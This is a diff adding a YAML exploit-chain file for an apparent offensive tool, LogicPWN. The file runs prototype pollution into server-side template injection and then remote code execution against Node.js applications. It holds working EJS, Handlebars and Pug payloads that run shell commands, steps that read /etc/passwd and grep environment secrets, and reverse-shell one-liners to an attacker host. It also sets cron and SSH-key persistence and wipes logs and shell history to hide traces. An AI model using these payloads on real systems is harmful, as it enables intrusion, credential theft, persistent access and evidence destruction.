@@ -1,0 +1,379 @@
+# LogicPWN Comprehensive Exploit Chain: Prototype Pollution → SSTI → RCE
+# This YAML exploit demonstrates a complete vulnerability chain exploitation
+# Author: LogicPWN Security Research Team
+# Target: Vulnerable Node.js application with prototype pollution and template injection
+
+exploit_chain:
+  name: "Prototype Pollution → SSTI → RCE Chain"
+  description: "Comprehensive multi-stage exploit chain targeting Node.js applications with prototype pollution leading to Server-Side Template Injection and Remote Code Execution"
+  parallel_execution: false  # Sequential execution required for dependency chain
+  session_state: {}
+  
+  steps:
+    # Stage 1: Reconnaissance and Target Identification
+    - name: "Target Discovery"
+      description: "Identify target application and check for Node.js/Express indicators"
+      request_config:
+        method: "GET"
+        url: "{{target_base_url}}"
+        headers:
+          User-Agent: "Mozilla/5.0 (compatible; LogicPWN Security Scanner)"
+          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+      success_indicators:
+        - "status_code == 200"
+        - "py:'express' in response.headers.get('x-powered-by', '').lower()"
+        - "py:'node' in response.text.lower() or 'javascript' in response.text.lower()"
+      failure_indicators:
+        - "status_code >= 400"
+        - "connection_error"
+      data_extractors:
+        server_header: "headers:server"
+        powered_by: "headers:x-powered-by"
+        csrf_token: "regex:<meta name=\"csrf-token\" content=\"([^\"]+)\""
+      retry_count: 2
+      critical: true
+      delay_after_step: 1.0
+
+    # Stage 2: Prototype Pollution Discovery
+    - name: "Prototype Pollution Detection"
+      description: "Test for prototype pollution vulnerability via constructor.prototype manipulation"
+      request_config:
+        method: "POST"
+        url: "{{target_base_url}}/api/config"
+        headers:
+          Content-Type: "application/json"
+          User-Agent: "Mozilla/5.0 (compatible; LogicPWN Security Scanner)"
+          X-Requested-With: "XMLHttpRequest"
+          X-CSRF-Token: "{{csrf_token}}"
+        json_data:
+          "constructor.prototype.polluted": "LogicPWN_Test_{{random_id}}"
+          "constructor.prototype.isAdmin": true
+          "constructor.prototype.role": "administrator"
+          "__proto__.polluted": "LogicPWN_Prototype_{{random_id}}"
+          "__proto__.isAdmin": true
+          "__proto__.template_engine": "ejs"
+      success_indicators:
+        - "status_code == 200"
+        - "py:'success' in response.json().get('status', '')"
+        - "py:not any('error' in str(v).lower() for v in response.json().values())"
+      failure_indicators:
+        - "status_code >= 400"
+        - "py:'error' in response.json().get('status', '')"
+        - "py:'rejected' in response.text.lower()"
+      data_extractors:
+        pollution_id: "static:LogicPWN_Test_{{random_id}}"
+        response_data: "json:data"
+      retry_count: 3
+      critical: true
+      delay_after_step: 2.0
+
+    # Stage 3: Prototype Pollution Verification
+    - name: "Pollution Verification"
+      description: "Verify prototype pollution worked by checking if polluted properties are accessible"
+      request_config:
+        method: "GET"
+        url: "{{target_base_url}}/api/status"
+        headers:
+          User-Agent: "Mozilla/5.0 (compatible; LogicPWN Security Scanner)"
+          Cookie: "session={{session_id}}"
+      success_indicators:
+        - "status_code == 200"
+        - "py:'LogicPWN_Test_{{random_id}}' in response.text"
+        - "py:'administrator' in response.json().get('user', {}).get('role', '')"
+        - "py:response.json().get('isAdmin', False) == True"
+      failure_indicators:
+        - "status_code >= 400"
+        - "py:'LogicPWN_Test_{{random_id}}' not in response.text"
+      data_extractors:
+        admin_status: "json:isAdmin"
+        user_role: "json:user.role"
+        polluted_value: "json:polluted"
+      retry_count: 2
+      critical: true
+      delay_after_step: 1.5
+
+    # Stage 4: SSTI Template Engine Detection
+    - name: "Template Engine Fingerprinting"
+      description: "Identify the template engine in use for SSTI exploitation"
+      request_config:
+        method: "POST"
+        url: "{{target_base_url}}/api/render"
+        headers:
+          Content-Type: "application/json"
+          User-Agent: "Mozilla/5.0 (compatible; LogicPWN Security Scanner)"
+          X-Requested-With: "XMLHttpRequest"
+        json_data:
+          template: "{{7*7}}"
+          content: "Test template rendering"
+          format: "html"
+      success_indicators:
+        - "status_code == 200"
+        - "py:'49' in response.text or '7*7' in response.text"
+      failure_indicators:
+        - "status_code >= 400"
+        - "py:'error' in response.json().get('status', '')"
+      data_extractors:
+        template_output: "json:rendered"
+        template_engine: "headers:x-template-engine"
+      retry_count: 2
+      critical: false
+      delay_after_step: 1.0
+
+    # Stage 5: SSTI Payload Injection (Handlebars/Mustache)
+    - name: "SSTI Handlebars Exploitation"
+      description: "Exploit Server-Side Template Injection using Handlebars-specific payloads"
+      request_config:
+        method: "POST"
+        url: "{{target_base_url}}/api/render"
+        headers:
+          Content-Type: "application/json"
+          User-Agent: "Mozilla/5.0 (compatible; LogicPWN Security Scanner)"
+          Authorization: "Bearer {{auth_token}}"
+        json_data:
+          template: "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{#with string.split(\"\") as |codelist|}}{{this.pop}}{{#with \"constructor\" as |cons|}}{{#with split as |splitter|}}{{this.pop}}{{#with (splice codelist 1) as |codelist|}}{{this.pop}}{{#with codelist as |constructor|}}{{this.push (concat \"return JSON.stringify(process.env)\")}}{{#each constructor}}{{#with (string.split @index) as |str|}}{{#each str}}{{#with (constructor.pop) as |result|}}{{result}}{{/with}}{{/each}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}{{/with}}"
+          data:
+            user: "{{user_id}}"
+            admin: true
+      success_indicators:
+        - "status_code == 200"
+        - "py:'PATH' in response.text or 'NODE_ENV' in response.text"
+        - "py:'process.env' in response.text.lower()"
+      failure_indicators:
+        - "status_code >= 400"
+        - "py:'error' in response.text.lower()"
+      data_extractors:
+        environment_data: "regex:\"PATH\":\"([^\"]+)\""
+        node_env: "regex:\"NODE_ENV\":\"([^\"]+)\""
+      retry_count: 2
+      critical: true
+      delay_after_step: 2.0
+
+    # Stage 6: SSTI EJS Exploitation (Alternative Engine)
+    - name: "SSTI EJS Exploitation"
+      description: "Exploit Server-Side Template Injection using EJS-specific payloads for process execution"
+      request_config:
+        method: "POST"
+        url: "{{target_base_url}}/api/template"
+        headers:
+          Content-Type: "application/json"
+          User-Agent: "Mozilla/5.0 (compatible; LogicPWN Security Scanner)"
+        json_data:
+          template: "<%- global.process.mainModule.require('child_process').execSync('id').toString() %>"
+          engine: "ejs"
+          context:
+            user: "admin"
+            session: "{{session_id}}"
+      success_indicators:
+        - "status_code == 200"
+        - "py:'uid=' in response.text and 'gid=' in response.text"
+        - "py:'root' in response.text or 'www-data' in response.text"
+      failure_indicators:
+        - "status_code >= 400"
+        - "py:'syntax error' in response.text.lower()"
+      data_extractors:
+        command_output: "regex:uid=([^\\s]+)"
+        user_context: "json:user"
+      retry_count: 3
+      critical: true
+      delay_after_step: 2.0
+
+    # Stage 7: Remote Code Execution - Information Gathering
+    - name: "RCE Information Gathering"
+      description: "Execute system commands to gather target information"
+      request_config:
+        method: "POST"
+        url: "{{target_base_url}}/api/render"
+        headers:
+          Content-Type: "application/json"
+          User-Agent: "Mozilla/5.0 (compatible; LogicPWN Security Scanner)"
+        json_data:
+          template: "<%- global.process.mainModule.require('child_process').execSync('uname -a && whoami && pwd && ls -la').toString() %>"
+          format: "raw"
+      success_indicators:
+        - "status_code == 200"
+        - "py:'Linux' in response.text or 'Darwin' in response.text"
+        - "py:any(user in response.text for user in ['root', 'www-data', 'node', 'ubuntu'])"
+      failure_indicators:
+        - "status_code >= 400"
+        - "py:'command not found' in response.text"
+      data_extractors:
+        system_info: "regex:Linux ([^\\s]+)"
+        current_user: "regex:whoami[\\r\\n]+([^\\r\\n]+)"
+        working_directory: "regex:pwd[\\r\\n]+([^\\r\\n]+)"
+      retry_count: 2
+      critical: true
+      delay_after_step: 2.0
+
+    # Stage 8: Network Discovery and Persistence
+    - name: "Network Discovery"
+      description: "Discover network configuration and establish persistence mechanisms"
+      request_config:
+        method: "POST"
+        url: "{{target_base_url}}/api/template"
+        headers:
+          Content-Type: "application/json"
+          User-Agent: "Mozilla/5.0 (compatible; LogicPWN Security Scanner)"
+        json_data:
+          template: "<%- global.process.mainModule.require('child_process').execSync('ip addr show || ifconfig && netstat -tuln || ss -tuln').toString() %>"
+          options:
+            timeout: 10000
+            maxBuffer: 1048576
+      success_indicators:
+        - "status_code == 200"
+        - "py:'inet ' in response.text or '127.0.0.1' in response.text"
+        - "py:any(port in response.text for port in ['80', '443', '22', '3000'])"
+      failure_indicators:
+        - "status_code >= 400"
+        - "py:'timeout' in response.text.lower()"
+      data_extractors:
+        network_interfaces: "regex:inet ([0-9.]+)"
+        listening_ports: "regex::([0-9]+)\\s"
+        services: "json:services"
+      retry_count: 2
+      critical: false
+      delay_after_step: 3.0
+
+    # Stage 9: File System Access and Sensitive Data Extraction
+    - name: "Sensitive Data Extraction"
+      description: "Access sensitive files and extract configuration data"
+      request_config:
+        method: "POST"
+        url: "{{target_base_url}}/api/render"
+        headers:
+          Content-Type: "application/json"
+          User-Agent: "Mozilla/5.0 (compatible; LogicPWN Security Scanner)"
+        json_data:
+          template: "<%- global.process.mainModule.require('child_process').execSync('find /etc -name \"*.conf\" -o -name \"*.config\" | head -10 && cat /etc/passwd | head -10 && env | grep -E \"(API|SECRET|TOKEN|PASSWORD)\"').toString() %>"
+          security_context: "elevated"
+      success_indicators:
+        - "status_code == 200"
+        - "py:'/etc/' in response.text"
+        - "py:'root:' in response.text or 'API' in response.text"
+      failure_indicators:
+        - "status_code >= 400"
+        - "py:'permission denied' in response.text.lower()"
+      data_extractors:
+        config_files: "regex:/etc/([^\\s]+\\.conf)"
+        users: "regex:([^:]+):x:[0-9]+"
+        environment_secrets: "regex:(API_[^=]+)=([^\\s]+)"
+      retry_count: 2
+      critical: false
+      delay_after_step: 2.0
+
+    # Stage 10: Reverse Shell Establishment
+    - name: "Reverse Shell Setup"
+      description: "Establish reverse shell connection for persistent access"
+      request_config:
+        method: "POST"
+        url: "{{target_base_url}}/api/execute"
+        headers:
+          Content-Type: "application/json"
+          User-Agent: "Mozilla/5.0 (compatible; LogicPWN Security Scanner)"
+          X-Shell-Token: "{{csrf_token}}"
+        json_data:
+          command: "bash"
+          args: 
+            - "-c"
+            - "bash -i >& /dev/tcp/{{attacker_ip}}/{{attacker_port}} 0>&1 || nc {{attacker_ip}} {{attacker_port}} -e /bin/bash || python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{{attacker_ip}}',{{attacker_port}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i'])\""
+          template: "<%- global.process.mainModule.require('child_process').spawn('{{command}}', {{args}}, {detached: true, stdio: 'ignore'}).unref() %>"
+          background: true
+      success_indicators:
+        - "status_code == 200"
+        - "py:'spawned' in response.json().get('status', '')"
+        - "py:'background' in response.text.lower()"
+      failure_indicators:
+        - "status_code >= 400"
+        - "py:'failed' in response.json().get('status', '')"
+      data_extractors:
+        process_id: "json:pid"
+        shell_status: "json:status"
+      retry_count: 1
+      critical: false
+      delay_after_step: 5.0
+
+    # Stage 11: Post-Exploitation Cleanup
+    - name: "Evidence Cleanup"
+      description: "Clean up logs and traces of exploitation"
+      request_config:
+        method: "POST"
+        url: "{{target_base_url}}/api/template"
+        headers:
+          Content-Type: "application/json"
+          User-Agent: "Mozilla/5.0 (compatible; LogicPWN Security Scanner)"
+        json_data:
+          template: "<%- global.process.mainModule.require('child_process').execSync('history -c && echo \"\" > ~/.bash_history && find /var/log -name \"*.log\" -exec truncate -s 0 {} \\; 2>/dev/null || true').toString() %>"
+          cleanup: true
+          stealth: true
+      success_indicators:
+        - "status_code == 200"
+        - "py:len(response.text.strip()) == 0 or 'cleaned' in response.text.lower()"
+      failure_indicators:
+        - "status_code >= 400"
+        - "py:'error' in response.text.lower()"
+      data_extractors:
+        cleanup_status: "json:status"
+      retry_count: 1
+      critical: false
+      delay_after_step: 1.0
+
+  # Global Configuration
+  global_config:
+    max_session_state_size: 2000
+    max_session_state_keys: 150
+    circuit_breaker_failure_threshold: 5
+    circuit_breaker_recovery_timeout: 60.0
+    circuit_breaker_success_threshold: 3
+    default_timeout: 30.0
+    max_retries: 3
+    stealth_mode: true
+    
+  # Required Session Variables (to be set before execution)
+  required_variables:
+    - target_base_url      # e.g., "https://vulnerable-app.com"
+    - attacker_ip         # e.g., "192.168.1.100"
+    - attacker_port       # e.g., 4444
+    - random_id          # e.g., "abc123def456"
+    - session_id         # e.g., obtained from initial authentication
+    - auth_token         # e.g., JWT or session token
+    - user_id           # e.g., target user identifier
+
+# Payload Library for Manual Testing
+payload_library:
+  prototype_pollution:
+    basic:
+      - '{"__proto__": {"polluted": true}}'
+      - '{"constructor": {"prototype": {"polluted": true}}}'
+      - 'constructor[prototype][polluted]=true'
+      
+    advanced:
+      - '{"__proto__": {"isAdmin": true, "role": "administrator"}}'
+      - '{"constructor": {"prototype": {"template_engine": "ejs", "view_cache": false}}}'
+      
+  ssti_payloads:
+    handlebars:
+      - '{{constructor.constructor("return process.env")()}}'
+      - '{{#with "s" as |string|}}{{#with "constructor"}}{{this[string]}}{{/with}}{{/with}}'
+      
+    ejs:
+      - '<%- global.process.mainModule.require("child_process").execSync("id") %>'
+      - '<%= global.process.mainModule.constructor._load("child_process").execSync("whoami") %>'
+      
+    jade_pug:
+      - '#{global.process.mainModule.require("child_process").execSync("id")}'
+      - '- var x = global.process.mainModule.require("child_process").execSync("whoami")'
+      
+    rce_commands:
+      discovery:
+        - "uname -a"
+        - "whoami && id"
+        - "pwd && ls -la"
+        - "ps aux | head -20"
+        
+      network:
+        - "ip addr show || ifconfig"
+        - "netstat -tuln || ss -tuln"
+        - "arp -a"
+        
+      persistence:
+        - 'echo "*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/{{attacker_ip}}/{{attacker_port}} 0>&1\"" | crontab -'
+        - 'echo "ssh-rsa AAAAB3... user@attacker" >> ~/.ssh/authorized_keys'
